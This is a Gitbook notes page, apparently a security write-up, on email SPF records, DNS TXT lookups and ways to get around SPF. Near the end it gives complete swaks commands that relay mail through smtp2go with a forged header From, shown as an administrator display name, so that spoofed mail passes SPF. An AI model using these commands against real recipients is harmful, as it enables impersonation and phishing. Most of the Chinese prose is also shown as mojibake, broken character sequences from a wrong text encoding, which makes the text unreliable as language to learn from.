modifiers ä¼šè¢«å¿½ç•¥ã€‚ redirect=ï¼šåœ¨ domain ä¸Šé¢çš„ SPF è®°å½•ä¼šä»£æ›¿å½“å‰çš„ SPF è®°å½•ã€‚ exp=ï¼šå¦‚æœ SPF è®°å½•ä¼°å€¼å¤±è´¥ï¼Œå¹¶ä¸”å­˜åœ¨ exp modifierï¼ŒSPF è¿”å›ä¸€ä¸ªä¸²æ¥è§£é‡ŠåŸå› ã€‚ EXAMPLE å¦‚ï¼š å¦‚æœ mail.smtp2go.com æ˜¯æˆ‘çš„é‚®ä»¶æœåŠ¡å™¨ï¼Œé‚£ä¹ˆ gmail æœåŠ¡å™¨æ”¶åˆ°çš„æº IP ä¹Ÿè‚¯å®šæ˜¯ mail.smtp2go.com çš„ IPã€‚ gmail ä¼šæ ¡éªŒé‚®ä»¶å‘é€è€…çš„ IP æ˜¯å¦å­˜åœ¨äº smtp.from çš„åŸŸå spf é…ç½®åˆ—è¡¨é‡Œã€‚ ä½¿ç”¨ Swaks swaks --to rvn0xsy@gmail.com --from admin@qq.com --ehlo gmail.com --body hello --server mail.smtp2go.com -p 2525 -au -ap smtp.from å°±æ˜¯ admin@qq.comï¼Œå’Œ mail.smtp2go.com çš„ IP è‚¯å®šä¸åŒï¼Œæ‰€ä»¥ SPF æ ¡éªŒå¤±è´¥ï¼Œè€Œæ ¡éªŒå¤±è´¥çš„é‚®ä»¶ï¼Œä¼šæœ‰å¾ˆé«˜çš„å‡ ç‡è¢«æ‰”åˆ°åƒåœ¾é‚®ä»¶ä¸­ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœæœªè®¾ç½® Mail.From ä¹Ÿå°±æ˜¯é‚®ä»¶å¤´çš„ Fromï¼Œåˆ™ä¼šä½¿ç”¨ smtp.from ä½œä¸º Mail.Fromã€‚ What is a DNS TXT record? DNSâ€œæ–‡æœ¬â€(TXT) è®°å½•å…è®¸åŸŸç®¡ç†å‘˜å°†æ–‡æœ¬è¾“å…¥åˆ°åŸŸåç³»ç»Ÿ (DNS) ä¸­ã€‚TXT è®°å½•æœ€åˆçš„ç›®çš„æ˜¯ç”¨ä½œå­˜æ”¾äººç±»å¯è¯»ç¬”è®°çš„åœ°æ–¹ã€‚ä½†æ˜¯ï¼Œç°åœ¨ä¹Ÿå¯ä»¥å°†ä¸€äº›æœºå™¨å¯è¯»çš„æ•°æ®æ”¾å…¥ TXT è®°å½•ä¸­ã€‚ ä¸€ä¸ªåŸŸå¯ä»¥æœ‰è®¸å¤š TXT è®°å½•ã€‚ https://www.cloudflare.com/zh-cn/learning/dns/dns-records/dns-txt-record/ TXT è®°å½•ç¤ºä¾‹ï¼š example.com record type value TTL @ TXT This is an awesome domain!Definitely not spammy. 32600 å¦‚ä»Šï¼ŒDNS TXT è®°å½•çš„ä¸¤ä¸ªæœ€é‡è¦ç”¨é€”æ˜¯é˜²æ­¢åƒåœ¾é‚®ä»¶å’ŒåŸŸåæ‰€æœ‰æƒéªŒè¯ï¼Œå°½ç®¡ TXT è®°å½•æœ€åˆå¹¶éä¸ºè¿™äº›ç”¨é€”è€Œè®¾è®¡ã€‚ æŸ¥è¯¢ SPF # nslookup -q=txt åŸŸå PS C:\\Users\\Zor0> nslookup é»˜è®¤æœåŠ¡å™¨: public1.114dns.com Address: 114.114.114.114 > set q=txt > xxxmail.cn æœåŠ¡å™¨: public1.114dns.com Address: 114.114.114.114 éæƒå¨åº”ç­”: xxxmail.cn text = \"v=spf1 include:spf.xxxmail.net -all\" xxxmail.cn text = \"google-site-verification=gaJnHwop8lmlGBgKzMLsyFqJ9TY0_DOdkdM9UBvze0E\" xxxmail.cn text = \"tg31lc1l55edu0a18a5pncvugs\" # æ²¡æœ‰ SPF PS C:\\Users\\Zor0> nslookup é»˜è®¤æœåŠ¡å™¨: UnKnown Address: 192.168.170.16 > set q=txt > 5000.cn æœåŠ¡å™¨: UnKnown Address: 192.168.170.16 5000.cn primary name server = ns3.dns.com responsible mail addr = admin.dns.com serial = 1546510465 refresh = 7200 (2 hours) retry = 3600 (1 hour) expire = 1209600 (14 days) default TTL = 1800 (30 mins) > SPF çš„ç»•è¿‡ æˆ‘ä»¬åªéœ€è¦è®© smtp.from åŸŸåä¸­é…ç½®çš„ txt è®°å½•å’Œå‘ä¿¡ IP ä¸€ç›´é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡ SPF æ ¡éªŒã€‚åˆæˆ–è€…æœ‰çš„åŸŸåæ²¡æœ‰é…ç½® SPF é‚£ä¹ˆä¹Ÿå¯ä»¥è¿›è¡Œä¼ªé€ ã€‚ ç”±äºé‚®ä»¶æ˜¾ç¤ºçš„æ˜¯ Header ä¸­çš„ From ä¸æ˜¯ smtp.fromï¼Œå› æ­¤å¯ä»¥å°† smtp.from è®¾ç½®ä¸ºæ­£å¸¸çš„é‚®ä»¶æœåŠ¡å™¨åœ°å€ï¼Œä¼ªé€ ä¸€ä¸ª Mail.From å³å¯ã€‚ swaks --to payloads@aliyun.com --from xx@smtp2go.com --h-From: 'ç®¡ç†å‘˜' --ehlo gmail.com --body hello --server mail.smtp2go.com -p 2525 -au -ap Gmail æ¥æ”¶åˆ°è¿™å°é‚®ä»¶åï¼Œä¼šæ ¡éªŒ --from xx@smtp2go.com ä¸­çš„ smtp2go.com æ˜¯å¦ç­‰äº mail.smtp2go.com çš„ IPï¼Œç”±äºæ˜¯ç›¸ç­‰çš„ï¼Œæ‰€ä»¥å®Œæˆäº† SPF çš„æ ¡éªŒã€‚ è€Œ DKIM æ˜¯æ ¡éªŒé‚®ä»¶å®Œæ•´æ€§çš„ï¼Œsmtp2go ä¸ Gmail ç›´æ¥ä½¿ç”¨çš„æ˜¯ TLSï¼Œä¸ä¼šå‘ç”Ÿä»€ä¹ˆé—®é¢˜ã€‚ 0x00 å‰äººæ ½æ ‘ https://payloads.online/archivers/2019-05-09/1/ Copyright & Copy zha0cai all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ä»¶ä¿®è®¢æ—¶é—´ï¼š 2023-05-14 17:51:41 "}}